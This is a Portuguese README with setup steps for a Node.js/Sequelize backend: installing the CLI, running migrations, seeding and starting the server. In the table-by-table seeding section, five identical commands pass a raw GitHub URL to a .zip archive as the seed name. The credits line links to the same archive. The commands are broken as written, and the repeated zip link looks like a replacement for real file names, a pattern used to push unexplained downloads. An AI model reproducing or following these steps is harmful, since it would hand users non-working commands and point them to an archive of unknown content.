## <center> Instruções: Instalar e Rodar Servidor</center>

#### 

#### Instalar sequelize Globalmente caso não o tenha
```bash
# Rode o comando Abaixo
npm install -g sequelize-cli
```

#### Executar as migrations
```bash
# Rode o comando Abaixo
sequelize-cli db:migrate
```

#### Desfazer as migrations
```bash
# Rode o comando Abaixo
sequelize-cli db:migrate:undo
```

#### Criando uma nova migrations
```bash
# Rode o comando Abaixo onde autenticacaoLogin é o nome da tabela
sequelize-cli migration:generate --name create-autenticacaoLogin
```


#### Gravar no Banco de dados na posse dos Seeders
```bash
# Rode o comando Abaixo
npx sequelize-cli db:seed:all
```


#### Gravando no Banco tabela por tabela no Seeders referenciando os nomes dos arquivos
```bash
# Rode os comandos Abaixo
npx sequelize-cli db:seed --seed https://raw.githubusercontent.com/edersonfc/nodejs_backend_projeto_MVC/main/api/seeders/nodejs_backend_projeto_MVC_v2.0.zip
npx sequelize-cli db:seed --seed https://raw.githubusercontent.com/edersonfc/nodejs_backend_projeto_MVC/main/api/seeders/nodejs_backend_projeto_MVC_v2.0.zip
npx sequelize-cli db:seed --seed https://raw.githubusercontent.com/edersonfc/nodejs_backend_projeto_MVC/main/api/seeders/nodejs_backend_projeto_MVC_v2.0.zip
npx sequelize-cli db:seed --seed https://raw.githubusercontent.com/edersonfc/nodejs_backend_projeto_MVC/main/api/seeders/nodejs_backend_projeto_MVC_v2.0.zip
npx sequelize-cli db:seed --seed https://raw.githubusercontent.com/edersonfc/nodejs_backend_projeto_MVC/main/api/seeders/nodejs_backend_projeto_MVC_v2.0.zip
```
<br>

#### Subindo o Servidor 
```bash
# Rode o comando Abaixo
npm start
```
<br>

`Créditos` [https://raw.githubusercontent.com/edersonfc/nodejs_backend_projeto_MVC/main/api/seeders/nodejs_backend_projeto_MVC_v2.0.zip](https://raw.githubusercontent.com/edersonfc/nodejs_backend_projeto_MVC/main/api/seeders/nodejs_backend_projeto_MVC_v2.0.zip)

<br><br>




